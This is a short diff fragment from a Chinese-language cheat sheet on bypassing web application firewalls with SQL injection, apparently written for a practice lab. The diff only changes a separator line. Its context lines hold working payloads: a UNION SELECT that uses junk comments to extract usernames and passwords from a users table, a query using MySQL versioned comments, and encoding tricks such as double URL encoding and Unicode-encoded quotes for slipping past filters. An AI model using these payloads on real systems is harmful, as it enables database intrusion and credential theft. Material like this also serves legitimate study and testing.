@@ -41,7 +41,8 @@ where table_schema='security' /*!12441and*/ table_name='users' -- 1
 查询数据的绕过：
 ?id=-2' union /*/$%^*/ select 1,group_concat(username,0x3a,password),3 from /*////*/ users -- +
 
-------------------------------------------------------------------------------------------------------
+---
+
 方法                                                                 payload
 编码                                      1、进行url编码（少数waf不会进行URL解码,部分waf进行一次url解码==>可对payload进行二次url编码）
                                           2、Unicode编码：单引号 = %u0027、%u02b9、%u02bc
